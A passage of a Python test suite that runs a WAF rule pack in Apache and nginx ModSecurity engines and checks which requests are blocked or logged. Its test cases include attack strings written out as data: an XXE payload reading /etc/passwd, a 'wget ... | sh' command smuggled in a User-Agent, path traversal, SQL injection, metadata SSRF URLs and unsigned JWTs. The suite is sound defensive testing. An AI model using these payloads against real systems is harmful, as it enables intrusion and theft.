"""Run the WAF rule pack instead of reading it.

Every other check on examples/agentic-ai-attacks/waf compares documents with each other: the
blocklist with the IOC file, the rule ids with the README. None of them loads a rule. The pack
shipped that way, and the first time the ModSecurity file met an engine it did not load, one rule
never fired, four tempo rules did something other than their comments said, and a percent-encoded
path walked past the path rules. This module is what would have caught that.

Three layers, each skipped when what it needs is absent:

  * StaticRuleFileTests  - no engine. Pins the shapes behind the defects above, so they stay fixed
                           on a machine (and on the Windows CI job) that has no web server.
  * ApacheModSecurityV2  - Apache httpd + mod_security2.
    NginxModSecurityV3   - nginx + libmodsecurity3 + its nginx connector.
    The two *WithCoreRuleSet classes load the OWASP Core Rule Set first, which is how the rule
    file says it must be deployed and where two of its defects hid.
  * IRuleLogicTests      - tclsh, through scripts/tests/waf/irule_runtime.tcl.

Set WAF_ENGINES_REQUIRED=1 to turn "engine not installed" from a skip into a failure. CI sets it:
a suite that skips everything proves nothing, and would look exactly like a suite that passed.
Set WAF_ENGINES_SKIP=1 to skip the engine suites even where the engines exist (the mutation
harness does: it runs this directory once per mutation and needs only the static tests).

On Debian or Ubuntu:
    apt-get install apache2 libapache2-mod-security2 nginx libnginx-mod-http-modsecurity \\
        modsecurity-crs tcl
"""
import glob
import http.client
import os
import pathlib
import re
import shutil
import socket
import subprocess
import tempfile
import time
import unittest

ROOT = pathlib.Path(__file__).resolve().parents[2]
WAF = ROOT / "examples" / "agentic-ai-attacks" / "waf"
CONF = WAF / "modsecurity-agentic.conf"
LISTS = ("ua-block.txt", "ua-alert.txt", "blocklist-ipv4.txt")
REQUIRED = os.environ.get("WAF_ENGINES_REQUIRED") == "1"
SKIP = os.environ.get("WAF_ENGINES_SKIP") == "1"

BROWSER = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
LISTED_SOURCE = "127.7.0.20"    # appended to the test copy of the blocklist
INSIDE_SOURCE = "127.9.0.5"     # the test copy treats 127.9.0.0/16 as an internal range
XML_DTD = '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><a>&e;</a>'
ARTEX_NAME = r"(?i)(?:^|[^a-z])artex(?:$|[^a-z]|probe|bot)"
F5LABS_USER_AGENTS = [line for line in (pathlib.Path(__file__).resolve().parent / "waf" /
                                        "f5labs-artex-user-agents.txt").read_text().splitlines()
                      if line and not line.startswith("#")]
CRS_SETUP = pathlib.Path("/etc/modsecurity/crs/crs-setup.conf")
CRS_RULES = pathlib.Path("/usr/share/modsecurity-crs/rules")


def jwt(header):
    import base64
    return base64.urlsafe_b64encode(header.encode()).decode().rstrip("=") + ".e30."


def upload(filename):
    body = ('--x\r\nContent-Disposition: form-data; name="file"; filename="%s"\r\n'
            'Content-Type: application/octet-stream\r\n\r\nx\r\n--x--\r\n' % filename)
    return dict(method="POST", path="/login", body=body, ctype="multipart/form-data; boundary=x")


def form(path, body):
    return dict(method="POST", path=path, body=body, ctype="application/x-www-form-urlencoded")


def post(body, ctype):
    return dict(method="POST", path="/login", body=body, ctype=ctype)


# (name, request, expected status). A denial is 403, or 404 for W-AGT-020 and W-AGT-021, whose
# targets exist in the test document root so that "served" is 200 and cannot be mistaken for
# "refused". A request that should be let through to a path that does not exist expects the
# origin's own 404.
TIER_CASES = [
    ("baseline browser request", dict(), 200),
    ("001 artex-enrich", dict(ua="artex-enrich/1.0"), 403),
    ("001 ArtEx in mixed case", dict(ua="Mozilla/5.0 (compatible; ArtEx/1.0)"), 403),
    ("001 security-testing; authorized", dict(ua="Mozilla/5.0 (security-testing; authorized)"), 403),
    ("001 HexStrike", dict(ua="HexStrike-HTTP-Framework/1.0 (Advanced Security Testing)"), 403),
    ("001 a product whose name starts with the same letters is served", dict(ua="ArtExpo/3.2 CFNetwork/1410.0.3 Darwin/22.6.0"), 200),
    ("001 a product whose name contains the letters is served", dict(ua="SmartExchange/2.1"), 200),
    ("001 artex-agent (Dragos) is refused by the name rule", dict(ua="artex-agent"), 403),
    ("001 artex-judge-r121 (Dragos) is refused by the name rule", dict(ua="artex-judge-r121"), 403),
    ("002 web-shell manager", dict(ua="Mozilla/5.0 (compatible; CyberStrikeAI-WebShell/1.0)"), 403),
    ("a scripted client is not blocked for being scripted", dict(ua="python-urllib/3.12"), 200),
    ("001 ReconProbe is logged, not denied (low confidence, hunt only)", dict(ua="ReconProbe/1.0"), 200),
    ("003 a self-declared tester string is logged, not denied", dict(ua="Mozilla/5.0 (research; read-only; pentest)"), 200),
    ("004 canary path", dict(path="/zzz-nonexistent-xyz123"), 403),
    ("004 canary path, upper case", dict(path="/ZZZ-Nonexistent"), 403),
    ("004 canary path, encoded", dict(path="/zzz%2dnonexistent"), 403),
    ("004 artex-probe file", dict(path="/uploads/artex-probe-10422.txt"), 403),
    ("004 canary path with an underscore", dict(path="/zzz_nonexistent_abc.txt"), 403),
    ("004 the canary word with another separator is served", dict(path="/zzz.nonexistent"), 404),
    ("004 SSRF canary path with an intent counter", dict(path="/_i6084_probe_missing"), 403),
    ("004 SSRF canary path in a parameter", dict(path="/cb?u=http://h/_i49_probe_missing"), 403),
    ("004 SSRF canary path in a form body", form("/login", "u=http%3A%2F%2Fh%2F_i6084_probe_missing"), 403),
    ("004 a probe_missing URL in a form body with no counter is served", form("/login", "u=http%3A%2F%2Fh%2Fliveness_probe_missing"), 200),
    ("004 a probe_missing path with no intent counter is served", dict(path="/status/liveness_probe_missing"), 404),
    ("004 a one-digit counter is not the canary", dict(path="/_i6_probe_missing"), 404),
    ("004 a developer placeholder id is served (hunt, not deny)", dict(path="/api/objects/deadbeefdeadbeefdeadbeef12"), 404),
    ("004 canary user in the query", dict(path="/login?user=zz_no_such_user_9f3a"), 403),
    ("004 canary user in a form body", form("/login", "username=zzq.nonexistent9x7&password=x"), 403),
    ("004 encoded canary in a form body", form("/login", "email=precheck.not-a-user%40example.invalid"), 403),
    ("004 junk OAuth state", dict(path="/callback?code=AAAA&state=notvalidb64"), 403),
    ("004 metadata address", dict(path="/fetch?url=http://169.254.169.254/latest/meta-data/"), 403),
    ("004 canary in a JSON body", post('{"username":"zz_no_such_user_9f3a"}', "application/json"), 403),
    ("004 canary in a JSON body no processor claims", post('{"username":"zz_no_such_user_9f3a"}', "application/vnd.api+json"), 403),
    ("004 canary in a JSON body sent as text/plain", post('{"username":"zz_no_such_user_9f3a"}', "text/plain"), 403),
    ("004 canary in a JSON body with no Content-Type", post('{"username":"zz_no_such_user_9f3a"}', None), 403),
    ("005 unsigned JWT", dict(headers={"Authorization": "Bearer " + jwt('{"alg":"none","typ":"JWT"}')}), 403),
    ("005 unsigned JWT, typ first", dict(headers={"Authorization": "Bearer " + jwt('{"typ":"JWT","alg":"None"}')}), 403),
    ("005 unsigned JWT, NONE, typ first", dict(headers={"Authorization": "Bearer " + jwt('{"typ":"JWT","alg":"NONE"}')}), 403),
    ("005 unsigned JWT in a cookie", dict(headers={"Cookie": "session=" + jwt('{"alg":"none"}')}), 403),
    ("005 signed JWT is served", dict(headers={"Authorization": "Bearer " + jwt('{"alg":"RS256","typ":"JWT"}')}), 200),
    ("006 tagged SQL injection, %20", dict(path="/search?q=ARTEX'%20UNION%20SELECT%201--"), 403),
    ("006 tagged SQL injection, plus signs", dict(path="/search?q=ARTEX%27+UNION+SELECT+1"), 403),
    ("006 tagged SQL injection, comment-spaced", dict(path="/search?q=ARTEX'/**/AND/**/2>1"), 403),
    ("006 the word in prose is served", dict(path="/search?q=the%20artex's%20manual"), 404),
    ("007 probe account", form("/login", "email=i04probe1792451568%40x.com"), 403),
    ("007 an ordinary address is served", form("/login", "email=probe%40x.com"), 200),
    ("007 probe account, six-digit intent counter", form("/login", "email=i808807probe1792451568%40x.com"), 403),
    ("007 a pentest-probe sign-up with no counter is left to the hunts", form("/login", "email=pentestprobeq7m4z2%40x.com"), 200),
    ("008 task artifact", dict(path="/up/i4028.asp"), 403),
    ("008 task artifact, encoded extension", dict(path="/up/i4028.%70hp"), 403),
    ("008 task artifact with a path parameter", dict(path="/up/i4028.php;.jpg"), 403),
    ("008 task artifact with path info", dict(path="/up/i4028.php/x"), 403),
    ("008 index.php is served", dict(path="/index.php"), 404),
    ("008 install.php is served", dict(path="/install.php"), 404),
    ("008 task artifact with a leading zero in the counter", dict(path="/up/i0123.php"), 403),
    ("008 task artifact, six-digit intent counter", dict(path="/up/i808807.jsp"), 403),
    ("008 task artifact, seven-digit intent counter", dict(path="/up/i1234567.php"), 403),
    ("008 a two-digit name is served", dict(path="/i18.php"), 404),
    ("008 an eight-digit name is served", dict(path="/i12345678.php"), 404),
    ("008 log-poisoning shell name", dict(path="/x/cl1217.jsp"), 403),
    ("008 log-poisoning shell name with a path parameter", dict(path="/x/cl1217.jsp;x=1"), 403),
    ("008 an ordinary jsp is served", dict(path="/page2024.jsp"), 404),
    ("008 uploaded task artifact", upload("i4028.php"), 403),
    ("008 uploaded task artifact, six-digit counter", upload("i808807.aspx"), 403),
    ("008 an uploaded two-digit name is served", upload("i18.php"), 200),
    ("009 plain XML is served", post("<a>1</a>", "application/xml"), 200),
    ("011 command substitution in the User-Agent", dict(ua="x $(id)"), 403),
    ("011 download piped to a shell in the User-Agent", dict(ua="a; wget http://h/x | sh"), 403),
    ("011 an Android model code is served", dict(ua="Mozilla/5.0 (Linux; Android 14; SH-51C) AppleWebKit/537.36"), 200),
    ("012 upload filename climbs out", upload("../../x.py"), 403),
    ("012 upload named sitecustomize.py", upload("sitecustomize.py"), 403),
    ("012 an ordinary upload is served", upload("scan01.nii.gz"), 200),
    ("014 backslash traversal in the path", dict(path="/app/..%5c..%5cwin.ini"), 403),
    ("014 double-encoded traversal", dict(path="/app/%252e%252e/x"), 403),
    ("014 half-encoded dot-dot", dict(path="/app/.%2e/x"), 403),
    ("014 dot-dot with a path parameter", dict(path="/app/..;/x"), 403),
    ("014 dots and a semicolon in a query are served", dict(path="/search?q=wait..;then"), 404),
    ("014 traversal in a query parameter", dict(path="/dl?file=../../etc/passwd"), 403),
    ("014 encoded traversal in a query parameter", dict(path="/dl?file=..%2f..%2fetc%2fpasswd"), 403),
    ("014 traversal in a form body", form("/login", "file=..%2F..%2Fetc%2Fpasswd"), 403),
    ("014 backslash traversal in a form body", form("/login", "file=..%5C..%5Cwin.ini"), 403),
    ("014 dots inside a filename are served", dict(path="/files/report.v2..final.pdf"), 404),
    ("014 a numeric range is served", dict(path="/x?range=1..10"), 404),
    ("020 API specification from outside", dict(path="/openapi.json"), 404),
    ("020 API specification from an internal range", dict(path="/openapi.json", src=INSIDE_SOURCE), 200),
    ("021 .env", dict(path="/.env"), 404),
    ("021 .env, encoded", dict(path="/.%65nv"), 404),
    ("021 .env with a path parameter", dict(path="/.env;x"), 404),
    ("021 .env.production", dict(path="/app/.env.production"), 404),
    ("021 .git/config", dict(path="/.git/config"), 404),
    ("021 actuator/env from outside", dict(path="/actuator/env"), 404),
    ("021 actuator, encoded", dict(path="/%61ctuator/env"), 404),
    ("021 actuator with a path parameter", dict(path="/actuator;x/env"), 404),
    ("021 actuator/env from an internal range", dict(path="/actuator/env", src=INSIDE_SOURCE), 200),
    ("021 actuator/health stays open", dict(path="/actuator/health"), 200),
    ("021 a second /actuator/health later in the path is not the exemption", dict(path="/actuator/jolokia/actuator/health"), 404),
    ("021 pprof", dict(path="/debug/pprof/heap"), 404),
    ("010 listed source address", dict(src=LISTED_SOURCE), 403),
]

# Files the cases above expect to be SERVED when no rule refuses them.
DOCROOT_FILES = ("index.html", "login", "signup", "openapi.json", "actuator/env", "actuator/health",
                 "actuator/jolokia/actuator/health", ".env", ".env;x", "app/.env.production",
                 ".git/config", "debug/pprof/heap")

# Refused by nginx itself (400) before ModSecurity sees them; Apache hands them to the rules.
SERVER_NORMALIZED = [
    ("014 dot-dot in the path", dict(path="/app/../../etc/passwd")),
    ("014 encoded dot-dot in the path", dict(path="/app/%2e%2e/%2e%2e/etc/passwd")),
]

# Rules that log and let the request through: the status is 200 either way, so the test reads
# the engine's log for the rule id instead.
LOG_ONLY_CASES = [
    ("003 ffuf is logged, not blocked", dict(ua="Fuzz Faster U Fool v2.1.0-dev"), "9907003"),
    ("003 norma is logged, not blocked", dict(ua="norma/0.4"), "9907003"),
    ("003 norma at another version is logged", dict(ua="norma/1.2"), "9907203"),
    ("003 ReconProbe is logged, not blocked", dict(ua="ReconProbe/1.0"), "9907003"),
    ("003 pentest-probe (Bitrise)", dict(ua="pentest-probe-i5938/1.0"), "9907003"),
    ("003 authorized-pentest (Bitrise)", dict(ua="Mozilla/5.0 (compatible; authorized-pentest/bitrise-readonly)"), "9907003"),
    ("003 authorized-security-research (Bitrise)", dict(ua="Mozilla/5.0 (compatible; authorized-security-research)"), "9907003"),
    ("003 research-readonly (Bitrise)", dict(ua="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) research-readonly"), "9907003"),
    ("003 research; read-only (Bitrise)", dict(ua="Mozilla/5.0 (research; read-only; pentest)"), "9907003"),
    ("003 read-only-audit (Barracuda)", dict(ua="Mozilla/5.0 (compatible; read-only-audit)"), "9907003"),
    ("013 isCliRequest is logged, not blocked", dict(headers={"isCliRequest": "true"}), "9907013"),
]

# The other half of a log-only rule: a request it must NOT log. Absence cannot be waited for,
# so each is followed on the same connection by a request that logs 9907013; once that line is
# in the log, the request before it has finished logging too.
NOT_LOGGED_CASES = [
    ("003 norma later in the header is not the anchored match", dict(ua="Mozilla/5.0 abnorma/1.2"), "9907203"),
    ("003 a read-only kiosk is not a tester string", dict(ua="Mozilla/5.0 (Linux; read-only kiosk)"), "9907003"),
    ("003 a pentest product name is not a tester string", dict(ua="pentest-tools-dashboard/2.0"), "9907003"),
]


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def engine_missing(why):
    """Skip, or fail when CI has said the engines must be there."""
    if REQUIRED and not SKIP:
        raise AssertionError("WAF_ENGINES_REQUIRED=1 but " + why)
    raise unittest.SkipTest(why)


def crs_files():
    if not CRS_SETUP.exists() or not glob.glob(str(CRS_RULES / "*.conf")):
        engine_missing("the OWASP Core Rule Set (package modsecurity-crs) is not installed")
    return [str(CRS_SETUP), str(CRS_RULES / "*.conf")]


def rule_copy(dest, *, timed=False, v2_stream_block=False, count_crs_blocks=False):
    """A test copy of the rule file and its lists. Every edit asserts that it applied, so a
    reworded rule cannot turn a test into one that silently exercises the unedited file."""
    dest.mkdir(parents=True)
    for name in LISTS:
        shutil.copy(WAF / name, dest / name)
    with open(dest / "blocklist-ipv4.txt", "a") as fh:
        fh.write(LISTED_SOURCE + "\n")
    text = CONF.read_text()

    def swap(old, new, count=1):
        nonlocal text
        assert text.count(old) == count, (old, text.count(old))
        text = text.replace(old, new)

    # The loopback /16 the tests use as "inside", and W-AGT-020, which ships commented out.
    swap('"!@ipMatch 10.0.0.0/8,', '"!@ipMatch 127.9.0.0/16,10.0.0.0/8,', 2)
    swap('#SecRule REQUEST_FILENAME "@rx (?i)(?:\\.js\\.map|', 'SecRule REQUEST_FILENAME "@rx (?i)(?:\\.js\\.map|')
    swap('#    "id:9907020,', '    "id:9907020,')
    swap('#    SecRule REMOTE_ADDR "!@ipMatch', '    SecRule REMOTE_ADDR "!@ipMatch')
    if timed:
        # Every window 4 seconds and every penalty 1: short enough to watch a window end, and a
        # penalty shorter than its window so that "the counter is cleared when it trips" shows.
        for name, shipped in (("agt_err", 60), ("agt_denied", 120), ("agt_authfail", 300), ("agt_signup", 3600)):
            swap("expirevar:resource.%s=%d" % (name, shipped), "expirevar:resource.%s=4" % name)
        for shipped in (600, 1800, 900):
            swap("expirevar:resource.agt_penalty=%d" % shipped, "expirevar:resource.agt_penalty=1")
    if v2_stream_block:
        swap('#SecRule REQUEST_HEADERS:Content-Type "@contains xml" \\\n#    "id:9907209,',
             'SecRule REQUEST_HEADERS:Content-Type "@contains xml" \\\n    "id:9907209,')
        swap("#    SecRule STREAM_INPUT_BODY", "    SecRule STREAM_INPUT_BODY")
    if count_crs_blocks:
        swap('#SecRule TX:ANOMALY_SCORE "@ge %{tx.inbound_anomaly_score_threshold}" \\\n#    "id:9907160,',
             'SecRule TX:ANOMALY_SCORE "@ge %{tx.inbound_anomaly_score_threshold}" \\\n    "id:9907160,')
    (dest / "modsecurity-agentic.conf").write_text(text)
    return dest / "modsecurity-agentic.conf"


def document_root(base):
    root = base / "www"
    for rel in DOCROOT_FILES:
        target = root / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text("ok\n")
    return root


# The two body-processor rules of modsecurity.conf-recommended. They are part of the test on
# purpose: with them, ModSecurity v2 leaves REQUEST_BODY empty for JSON and XML.
BASE_RULES = '''SecRuleEngine On
SecRequestBodyAccess On
SecResponseBodyAccess Off
SecAuditEngine Off
SecRule REQUEST_HEADERS:Content-Type "^(?:application(?:/soap\\+|/)|text/)xml" "id:'200000',phase:1,t:none,t:lowercase,pass,nolog,ctl:requestBodyProcessor=XML"
SecRule REQUEST_HEADERS:Content-Type "^application/json" "id:'200001',phase:1,t:none,t:lowercase,pass,nolog,ctl:requestBodyProcessor=JSON"
'''


class Engine:
    """One web server process with one copy of the rule file loaded. Each runs in its own
    session: Apache signals its whole process group when it stops, which would otherwise
    include the test runner."""

    def __init__(self, base, name):
        self.dir = base / name
        self.dir.mkdir()
        self.port = free_port()
        self.proc = None
        self.connections = {}

    def launch(self, command):
        self.proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                                     start_new_session=True)
        deadline = time.time() + 20
        while time.time() < deadline and self.proc.poll() is None:
            try:
                socket.create_connection(("127.0.0.1", self.port), timeout=0.5).close()
                return self
            except OSError:
                time.sleep(0.1)
        self.stop()
        raise AssertionError("engine did not start: %s\n%s\n%s" % (self.dir, getattr(self, "startup_output", ""), self.log()))

    def log(self):
        path = self.dir / "error.log"
        return path.read_text(errors="replace") if path.exists() else ""

    def stop(self):
        for conn in self.connections.values():
            conn.close()
        self.connections = {}
        if self.proc and self.proc.poll() is None:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self.proc.kill()
                self.proc.wait()
        if self.proc and self.proc.stdout and not self.proc.stdout.closed:
            self.startup_output = self.proc.stdout.read()
            self.proc.stdout.close()

    def request(self, method="GET", path="/", ua=BROWSER, headers=None, body=None, ctype=None, src="127.7.1.1"):
        """One request. Requests from one source address share one keep-alive connection, so the
        server finishes a request's logging phase, where the counters are written, before it reads
        the next: without that a busy machine can read a counter the previous request has not
        stored yet, and a threshold test fails for no reason in the rules."""
        for attempt in (1, 2):
            conn = self.connections.get(src)
            if conn is None:
                conn = self.connections[src] = http.client.HTTPConnection(
                    "127.0.0.1", self.port, timeout=10, source_address=(src, 0))
            try:
                conn.putrequest(method, path, skip_accept_encoding=True)
                conn.putheader("User-Agent", ua)
                for key, value in (headers or {}).items():
                    conn.putheader(key, value)
                data = body.encode() if body is not None else None
                if ctype:
                    conn.putheader("Content-Type", ctype)
                if data is not None:
                    conn.putheader("Content-Length", str(len(data)))
                conn.endheaders(data)
                response = conn.getresponse()
                response.read()
                if response.will_close:
                    conn.close()
                    del self.connections[src]
                return response.status
            except (http.client.HTTPException, ConnectionError):
                conn.close()
                self.connections.pop(src, None)
                if attempt == 2:
                    raise


APACHE_MODULES = pathlib.Path("/usr/lib/apache2/modules")
NGINX_MODULE = pathlib.Path("/usr/lib/nginx/modules/ngx_http_modsecurity_module.so")


class ApacheEngine(Engine):
    @staticmethod
    def binary():
        return shutil.which("apache2") or shutil.which("httpd")

    @classmethod
    def available(cls):
        return not SKIP and bool(cls.binary()) and (APACHE_MODULES / "mod_security2.so").exists()

    def config(self, rule_file, docroot, crs=False):
        modules = "".join("LoadModule %s_module %s/mod_%s.so\n" % (m, APACHE_MODULES, m)
                          for m in ("mpm_prefork", "authz_core", "unique_id", "security2", "dir", "alias"))
        before = "".join("Include %s\n" % f for f in crs_files()) if crs else ""
        conf = self.dir / "httpd.conf"
        conf.write_text(
            "ServerRoot %s\nServerName localhost\nPidFile %s/httpd.pid\nDefaultRuntimeDir %s\nMutex file:%s default\n"
            "Listen 127.0.0.1:%d\n%sErrorLog %s/error.log\nDocumentRoot %s\n<Directory %s>\n  Require all granted\n</Directory>\n"
            "Redirect 403 /forbidden\nRedirect 401 /signin\n"
            "SecDataDir %s\nSecTmpDir %s\nSecStreamInBodyInspection On\n%s%sInclude %s\n"
            % (APACHE_MODULES.parent, self.dir, self.dir, self.dir, self.port, modules, self.dir, docroot, docroot,
               self.dir, self.dir, BASE_RULES, before, rule_file))
        return conf

    def check(self, rule_file, docroot):
        """Parse the configuration without serving: returns (exit code, output)."""
        run = subprocess.run([self.binary(), "-f", str(self.config(rule_file, docroot)), "-t"],
                             capture_output=True, text=True)
        return run.returncode, run.stdout + run.stderr

    def start(self, rule_file, docroot, crs=False):
        return self.launch([self.binary(), "-f", str(self.config(rule_file, docroot, crs)), "-DFOREGROUND"])


class NginxEngine(Engine):
    @staticmethod
    def binary():
        return shutil.which("nginx")

    @classmethod
    def available(cls):
        return not SKIP and bool(cls.binary()) and NGINX_MODULE.exists()

    def start(self, rule_file, docroot, crs=False):
        before = "".join("Include %s\n" % f for f in crs_files()) if crs else ""
        (self.dir / "modsec.conf").write_text(BASE_RULES + before + "Include %s\n" % rule_file)
        temp = "".join("  %s_temp_path %s/t-%s;\n" % (k, self.dir, k)
                       for k in ("client_body", "proxy", "fastcgi", "uwsgi", "scgi"))
        conf = self.dir / "nginx.conf"
        # One worker: libmodsecurity keeps collections in each worker's memory, so with more than
        # one the counters are split between them (the rule file and README say so).
        # Log level info: the connector reports a rule that matched and passed below "error".
        conf.write_text(
            "load_module %s;\n%sdaemon off;\nworker_processes 1;\npid %s/nginx.pid;\nerror_log %s/error.log info;\nevents {}\n"
            "http {\n  access_log off;\n%s  server {\n    listen 127.0.0.1:%d;\n    root %s;\n    modsecurity on;\n"
            "    modsecurity_rules_file %s/modsec.conf;\n    error_page 405 =200 $uri;\n"
            "    location = /forbidden { return 403; }\n    location = /signin { return 401; }\n    location / { }\n  }\n}\n"
            % (NGINX_MODULE, "user root;\n" if os.geteuid() == 0 else "", self.dir, self.dir, temp, self.port,
               docroot, self.dir))
        return self.launch([self.binary(), "-c", str(conf), "-e", str(self.dir / "error.log")])


class StaticRuleFileTests(unittest.TestCase):
    """The shapes behind the defects the engines found, checkable with no engine installed.
    Each REGRESSION test here has a mutation in scripts/tests/mutation-check.py."""

    @classmethod
    def setUpClass(cls):
        cls.text = CONF.read_text()
        cls.live = [l for l in cls.text.splitlines() if l.strip() and not l.lstrip().startswith("#")]
        cls.rules = re.split(r"\n(?=SecRule|SecAction)", "\n".join(cls.live))

    def rule(self, rule_id):
        found = [r for r in self.rules if "id:%s," % rule_id in r]
        self.assertEqual(len(found), 1, rule_id)
        return found[0]

    def test_no_doubled_backslash_inside_a_pattern(self):
        # REGRESSION: Apache collapses \\ inside a quoted directive, so [/\\] reached PCRE as an
        # unterminated class and the file did not load on ModSecurity v2. Write \x5c instead.
        for line in self.live:
            self.assertNotIn("\\\\", line, line)

    def test_the_counter_collection_is_opened_before_any_other_rule(self):
        # REGRESSION: a denial ends its phase, so initcol placed after the tier 1 rules never ran
        # for a request they refused, and those requests were missing from every counter.
        self.assertIn("initcol:", self.rules[0])

    def test_the_counters_are_not_in_the_collection_the_core_rule_set_keys_on_user_agent(self):
        # REGRESSION: the Core Rule Set opens IP first, keyed on address plus a User-Agent hash,
        # and on v2 a second initcol for it is ignored. Counters kept in IP were then per
        # User-Agent, and a client rotating that header was never boxed.
        self.assertIn("initcol:resource=", self.rules[0])
        for line in self.live:
            self.assertNotRegex(line, r"(?i)\bip[.:]agt_", line)

    def test_no_counter_rearms_its_own_expiry(self):
        # REGRESSION: "setvar:x=+1,expirevar:x=N" on one rule restarts the window on every hit, so a
        # counter fed more often than N seconds never expires.
        counters = set()
        for rule in self.rules:
            for name in re.findall(r"setvar:(resource\.\w+)=\+1", rule):
                counters.add(name)
                self.assertNotIn("expirevar:%s=" % name, rule, rule)
        self.assertEqual(len(counters), 4)

    def test_every_counter_has_a_window(self):
        # REGRESSION, the other half of the one above: a counter whose expiry is never armed does
        # not expire at all. Each must be armed by a rule that tests for the counter reaching 1.
        for name in ("agt_err", "agt_denied", "agt_authfail", "agt_signup"):
            arming = [r for r in self.rules if "expirevar:resource.%s=" % name in r]
            self.assertEqual(len(arming), 1, name)
            self.assertRegex(arming[0], r'RESOURCE:%s "@eq 1"' % name.upper())

    def test_every_denying_rule_feeds_the_repeat_violator_counter(self):
        # REGRESSION: W-AGT-034 counted every 403, including the application's own. It now counts
        # tx.agt_deny, which only helps if every rule that denies sets it. For a chained rule the
        # flag belongs on the last link, so it is looked for across the rule's lines.
        denying = [r for r in self.rules if re.search(r"[\",]deny,", r)]
        self.assertGreater(len(denying), 15)
        for rule in denying:
            rule_id = re.search(r"id:(\d+)", rule).group(1)
            if rule_id in ("9907101", "9907107"):   # the penalty box and the sign-up limit: not probes
                continue
            self.assertIn("setvar:tx.agt_deny=1", rule, rule_id)

    def test_the_signup_limit_only_refuses_signups(self):
        # REGRESSION: the deny rule tested the counter alone, so a fourth sign-up post made every
        # request from that address return 429.
        rule = self.rule("9907107")
        self.assertIn("TX:AGT_SIGNUP_HIT", rule)
        self.assertIn("RESOURCE:AGT_SIGNUP", rule)

    def test_path_rules_decode_before_matching(self):
        # REGRESSION: ModSecurity v2 gives phase 1 the path as sent; without urlDecodeUni
        # /%61ctuator/env and /.%65nv were served. The tempo rules' path tests need it too.
        for rule_id in ("9907021", "9907121", "9907008", "9907018", "9907104", "9907106"):
            self.assertIn("t:urlDecodeUni", self.rule(rule_id), rule_id)

    def test_the_xml_rule_reads_the_media_type_in_any_case(self):
        # REGRESSION: "@contains xml" on the header as sent let application/XML through.
        self.assertIn("t:lowercase", self.rule("9907009").splitlines()[1])

    def test_the_core_rule_set_blocking_rule_is_never_edited(self):
        # REGRESSION: a comment recommended SecRuleUpdateActionById on the Core Rule Set's blocking
        # rule to count its blocks. On libmodsecurity 3 that replaced the rule's deny.
        for line in self.live:
            self.assertNotIn("SecRuleUpdateActionById", line)

    def test_rule_ids_are_unique(self):
        ids = re.findall(r"^\s*#?\s*\"id:(\d+),", self.text, re.M)
        self.assertEqual(len(ids), len(set(ids)))
        self.assertGreater(len(ids), 30)

    def test_the_name_pattern_is_the_same_everywhere(self):
        # The ARTEX name pattern is written in four files. The published list is what it must
        # match, and a product name that only shares the letters is what it must not.
        named = [u for u in F5LABS_USER_AGENTS if re.search(ARTEX_NAME, u)]
        self.assertEqual(len(named), 44)
        for ua in ("SmartExchange/2.1", "ArtExpo/3.2 CFNetwork/1410.0.3", "ArtExplorer/1.0", "Artexte/2.0"):
            self.assertIsNone(re.search(ARTEX_NAME, ua), ua)
        assets = WAF.parent
        for path, pattern in ((CONF, "(?:^|[^a-z])artex(?:$|[^a-z]|probe|bot)"),
                              (WAF / "f5-irule-agentic.tcl", "(^|[^a-z])artex($|[^a-z]|probe|bot)"),
                              (assets / "sentinel-rules.yaml", "(^|[^a-z])artex($|[^a-z]|probe|bot)"),
                              (assets / "splunk-savedsearches.conf", "(^|[^a-z])artex($|[^a-z]|probe|bot)")):
            self.assertIn(pattern, path.read_text(), path.name)


class _EngineCase:
    """Mixin: starts the engines a test class asks for and stops them, whatever happens between."""

    engine_type = None
    engine_label = ""
    with_crs = False

    @classmethod
    def copies(cls):
        """name -> rule_copy keyword arguments; one engine is started per entry."""
        raise NotImplementedError

    @classmethod
    def setUpClass(cls):
        if not cls.engine_type.available():
            engine_missing("%s is not installed" % cls.engine_label)
        if cls.with_crs:
            crs_files()
        cls.base = pathlib.Path(tempfile.mkdtemp(prefix="waf-engine-"))
        os.chmod(cls.base, 0o755)
        cls.docroot = document_root(cls.base)
        cls.engines = {}
        try:
            for name, options in cls.copies().items():
                rule_file = rule_copy(cls.base / ("rules-" + name), **options)
                for attempt in (1, 2, 3):   # the port is chosen, released, then bound: retry a lost race
                    engine = cls.engine_type(cls.base, "%s-%d" % (name, attempt))
                    cls.engines[name] = engine
                    try:
                        engine.start(rule_file, cls.docroot, crs=cls.with_crs)
                        break
                    except AssertionError:
                        if attempt == 3:
                            raise
        except BaseException:
            cls.tearDownClass()
            raise

    @classmethod
    def tearDownClass(cls):
        for engine in getattr(cls, "engines", {}).values():
            engine.stop()
        if hasattr(cls, "base"):
            shutil.rmtree(cls.base, ignore_errors=True)

    @staticmethod
    def logged(engine, rule_id, since, timeout=5):
        """True once the engine's log, past offset `since`, names the rule. The log is written
        after the response, so this waits for it."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            if 'id "%s"' % rule_id in engine.log()[since:]:
                return True
            time.sleep(0.1)
        return False


class _ModSecurityCases:
    """Shared by both engines. `main` has the shipped thresholds; `timed` has every window at 4
    seconds and every penalty at 1."""

    server_normalized_status = 403

    def test_tier_one_and_two_requests(self):
        cases = TIER_CASES + [(n, r, self.server_normalized_status) for n, r in SERVER_NORMALIZED]
        self.assertGreater(len(cases), 70)
        for index, (name, request, want) in enumerate(cases):
            # One source address per case: the tempo tier would otherwise box the test client.
            request = dict({"src": "127.7.2.%d" % (index + 1)}, **request)
            with self.subTest(name):
                self.assertEqual(self.engines["main"].request(**request), want)

    def test_log_only_rules_log_and_serve(self):
        engine = self.engines["main"]
        for index, (name, request, rule_id) in enumerate(LOG_ONLY_CASES):
            with self.subTest(name):
                since = len(engine.log())
                self.assertEqual(engine.request(src="127.7.8.%d" % (index + 1), **request), 200)
                self.assertTrue(self.logged(engine, rule_id, since), rule_id)

    def test_log_only_rules_stay_quiet_on_near_misses(self):
